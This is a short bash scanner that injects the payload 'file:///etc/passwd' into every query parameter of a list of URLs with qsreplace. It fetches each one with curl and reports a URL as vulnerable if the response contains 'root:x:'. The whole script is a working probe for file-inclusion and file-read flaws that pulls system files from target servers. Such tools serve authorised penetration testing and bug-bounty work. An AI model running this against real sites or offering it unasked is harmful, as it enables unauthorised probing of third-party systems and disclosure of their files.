#!/bin/bash

# Check if a file containing URLs is provided as an argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <url_list_file>"
    exit 1
fi

url_list_file="$1"

cat $1 | qsreplace "file:///etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is vulnerable"; done